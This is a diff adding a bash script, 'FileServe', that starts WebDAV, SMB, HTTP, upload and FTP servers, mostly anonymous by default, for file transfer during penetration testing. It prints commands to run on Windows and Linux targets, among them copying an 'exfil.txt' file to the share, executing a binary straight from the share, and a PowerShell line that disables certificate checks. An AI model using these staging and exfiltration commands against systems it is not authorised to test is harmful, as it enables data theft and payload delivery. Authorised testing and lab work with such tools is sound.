@@ -1,0 +1,189 @@
+#!/bin/bash
+
+# --- Configuration ---
+APP_NAME="FileServe"
+HTTP_PORT=8000
+NGINX_PORT=9001
+SMB_PORT=445
+FTP_PORT=2121
+UPLOAD_PORT=8080
+WORKDIR=$(pwd)
+SMB_BIN_DIR="$HOME/.local/$APP_NAME"
+SMB_SCRIPT="$SMB_BIN_DIR/smbserver.py"
+
+# Default Credentials (Empty = Anonymous/No Auth)
+AUTH_USER=""
+AUTH_PASS=""
+
+# --- UI Colors ---
+G='\e[1;32m'; Y='\e[1;33m'; B='\e[1;34m'; NC='\e[0m'; R='\e[1;31m'
+
+# Auto-detect IP (tun0 > eth0 > ens33 > wlan0 > fallback)
+MY_IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || ip -4 addr show ens33 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || ip -4 addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I 2>/dev/null | awk '{print $1}' || echo "IP")
+
+show_help() {
+    echo -e "${B}$APP_NAME - File Transfer Toolkit${NC}"
+    echo -e "Usage: $APP_NAME [MODE] [OPTIONS]"
+    echo -e "\n${G}Modes:${NC}"
+    echo -e "  -n, --nginx      Nginx WebDAV (Upload + Download)"
+    echo -e "  -s, --smb        Impacket SMB Share"
+    echo -e "  -d, --download   Python Simple HTTP Server"
+    echo -e "  -u, --upload     Python Upload Server"
+    echo -e "  -f, --ftp        Python FTP Server"
+    echo -e "\n${G}Options:${NC}"
+    echo -e "  --ssl            Enable HTTPS for Nginx mode"
+    echo -e "  -p, --port       Specify custom port"
+    echo -e "  -U, --user       Specify username (Optional)"
+    echo -e "  -P, --pass       Specify password (Optional)"
+    echo -e "  -h, --help       Show this help menu"
+    exit 0
+}
+
+check_deps() {
+    DEPS="nginx python3 python3-pip openssl curl"
+    for pkg in $DEPS; do
+        if ! dpkg -s $pkg >/dev/null 2>&1; then
+            echo -e "${Y}[*] Installing system dependency: $pkg...${NC}"
+            sudo apt update -y >/dev/null 2>&1 && sudo apt install -y $pkg >/dev/null 2>&1
+        fi
+    done
+
+    # Check and install Python dependencies
+    PIP_PKGS="impacket pyftpdlib uploadserver"
+    for pip_pkg in $PIP_PKGS; do
+        if ! python3 -c "import $pip_pkg" >/dev/null 2>&1; then
+            echo -e "${Y}[!] Installing Python library: $pip_pkg...${NC}"
+            sudo pip3 install $pip_pkg --break-system-packages >/dev/null 2>&1
+        fi
+    done
+
+    if [ ! -f "$SMB_SCRIPT" ]; then
+        echo -e "${B}[*] Downloading compatible smbserver.py (v0.11.0)...${NC}"
+        mkdir -p "$SMB_BIN_DIR"
+        curl -s -o "$SMB_SCRIPT" https://raw.githubusercontent.com/fortra/impacket/impacket_0_11_0/examples/smbserver.py
+        chmod +x "$SMB_SCRIPT"
+    fi
+}
+
+run_nginx() {
+    PORT=${PORT:-$NGINX_PORT}
+    TMPDIR=$(mktemp -d)
+    mkdir -p "$WORKDIR/upload" "$TMPDIR/body"
+    SSL_CONF="listen $PORT;"
+    PROTO="http"; K=""; PS_BYPASS=""
+    
+    if [ "$USE_SSL" = true ]; then
+        PROTO="https"; K="-k "; PS_BYPASS="[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; "
+        openssl req -x509 -nodes -days 1 -newkey rsa:2048 -keyout "$TMPDIR/server.key" -out "$TMPDIR/server.crt" -subj "/C=US/O=$APP_NAME/CN=$APP_NAME" 2>/dev/null
+        SSL_CONF="listen $PORT ssl; ssl_certificate $TMPDIR/server.crt; ssl_certificate_key $TMPDIR/server.key;"
+    fi
+    
+    cat <<EOF > "$TMPDIR/nginx.conf"
+user $(whoami);
+worker_processes 1;
+pid $TMPDIR/nginx.pid;
+events { worker_connections 1024; }
+http {
+    client_body_temp_path $TMPDIR/body;
+    log_format simple '\$remote_addr - \$request - \$status (\$body_bytes_sent bytes)';
+    access_log $TMPDIR/access.log simple;
+    error_log $TMPDIR/error.log;
+    server {
+        $SSL_CONF
+        location / {
+            root $WORKDIR;
+            autoindex on;
+            dav_methods PUT DELETE MKCOL COPY MOVE;
+            create_full_put_path on;
+            client_max_body_size 0;
+        }
+    }
+}
+EOF
+    echo -e "${G}--- CLIENT COMMANDS (HTTP WebDAV) ---${NC}"
+    echo -e "${Y}Linux (cURL):${NC} curl $K-T file.txt $PROTO://$MY_IP:$PORT/upload/file.txt"
+    echo -e "${Y}PS (Upload):${NC}  ${PS_BYPASS}(New-Object System.Net.WebClient).UploadFile('$PROTO://$MY_IP:$PORT/upload/f.txt', 'PUT', 'f.txt')"
+    echo -e "${B}[*] $APP_NAME Nginx is live on port $PORT...${NC}"
+    sudo nginx -c "$TMPDIR/nginx.conf"
+    tail -f "$TMPDIR/access.log" &
+    TAIL_PID=$!
+    cleanup() { sudo kill $(cat "$TMPDIR/nginx.pid") 2>/dev/null; kill $TAIL_PID 2>/dev/null; rm -rf "$TMPDIR"; exit; }
+    trap cleanup INT
+    wait
+}
+
+if [[ $# -eq 0 ]]; then show_help; fi
+while [[ "$#" -gt 0 ]]; do
+    case $1 in
+        -n|--nginx)    MODE="nginx" ;;
+        -s|--smb)      MODE="smb" ;;
+        -d|--download) MODE="download" ;;
+        -u|--upload)   MODE="upload" ;;
+        -f|--ftp)      MODE="ftp" ;;
+        --ssl)         USE_SSL=true ;;
+        -p|--port)     PORT="$2"; shift ;;
+        -U|--user)     AUTH_USER="$2"; shift ;;
+        -P|--pass)     AUTH_PASS="$2"; shift ;;
+        -h|--help)     show_help ;;
+        *) echo -e "${R}Unknown option: $1${NC}"; exit 1 ;;
+    esac
+    shift
+done
+
+check_deps
+
+case $MODE in
+    nginx) 
+        run_nginx 
+        ;;
+    smb)
+        echo -e "${G}--- CLIENT COMMANDS (SMB) ---${NC}"
+        echo -e "${Y}CMD (Download):${NC} copy \\\\$MY_IP\\share\\file C:\\temp\\file"
+        echo -e "${Y}CMD (Upload):${NC}   copy C:\\temp\\exfil.txt \\\\$MY_IP\\share\\exfil.txt"
+        echo -e "${Y}PS (Run Direct):${NC} \\\\$MY_IP\\share\\binary.exe"
+        
+        if [[ -n "$AUTH_USER" && -n "$AUTH_PASS" ]]; then
+            echo -e "${Y}CMD (Mount):${NC}    net use D: \\\\$MY_IP\\share /user:$AUTH_USER $AUTH_PASS"
+            echo -e "${B}[*] Launching Stable SMB Server with User: $AUTH_USER...${NC}"
+            sudo python3 "$SMB_SCRIPT" share "$WORKDIR" -smb2support -user "$AUTH_USER" -password "$AUTH_PASS"
+        else
+            echo -e "${Y}CMD (Mount):${NC}    net use D: \\\\$MY_IP\\share"
+            echo -e "${B}[*] Launching Stable SMB Server (Anonymous)...${NC}"
+            sudo python3 "$SMB_SCRIPT" share "$WORKDIR" -smb2support
+        fi
+        ;;
+    download)
+        echo -e "${B}[*] $APP_NAME Download running on ${PORT:-$HTTP_PORT}...${NC}"
+        python3 -m http.server ${PORT:-$HTTP_PORT} 
+        ;;
+    upload)
+        echo -e "${G}--- CLIENT COMMANDS (Upload Server) ---${NC}"
+        
+        if [[ -n "$AUTH_USER" && -n "$AUTH_PASS" ]]; then
+            echo -e "${Y}Linux (cURL):${NC} curl -X POST http://$MY_IP:${PORT:-$UPLOAD_PORT}/upload -F 'files=@file.txt' -u $AUTH_USER:$AUTH_PASS"
+            echo -e "${B}[*] $APP_NAME Upload Server running on ${PORT:-$UPLOAD_PORT} with User: $AUTH_USER...${NC}"
+            python3 -m uploadserver ${PORT:-$UPLOAD_PORT} --basic-auth "$AUTH_USER:$AUTH_PASS"
+        else
+            echo -e "${Y}Linux (cURL):${NC} curl -X POST http://$MY_IP:${PORT:-$UPLOAD_PORT}/upload -F 'files=@file.txt'"
+            echo -e "${B}[*] $APP_NAME Upload Server running on ${PORT:-$UPLOAD_PORT} (Anonymous)...${NC}"
+            python3 -m uploadserver ${PORT:-$UPLOAD_PORT}
+        fi
+        ;;
+    ftp)
+        echo -e "${G}--- CLIENT COMMANDS (FTP) ---${NC}"
+        echo -e "${Y}PS (Download):${NC} (New-Object Net.WebClient).DownloadFile('ftp://$MY_IP:${PORT:-$FTP_PORT}/file.txt', 'C:\\Users\\Public\\ftp-file.txt')"
+        
+        if [[ -n "$AUTH_USER" && -n "$AUTH_PASS" ]]; then
+            echo -e "${Y}Linux (cURL):${NC} curl -u $AUTH_USER:$AUTH_PASS -T file.txt ftp://$MY_IP:${PORT:-$FTP_PORT}/"
+            echo -e "${B}[*] $APP_NAME FTP Server running on ${PORT:-$FTP_PORT} with User: $AUTH_USER...${NC}"
+            python3 -m pyftpdlib --port ${PORT:-$FTP_PORT} --write --user="$AUTH_USER" --password="$AUTH_PASS"
+        else
+            echo -e "${Y}Linux (cURL):${NC} curl -T file.txt ftp://$MY_IP:${PORT:-$FTP_PORT}/"
+            echo -e "${B}[*] $APP_NAME FTP Server running on ${PORT:-$FTP_PORT} (Anonymous)...${NC}"
+            python3 -W ignore -m pyftpdlib --port ${PORT:-$FTP_PORT} --write
+        fi
+        ;;
+    *) 
+        show_help 
+        ;;
+esac
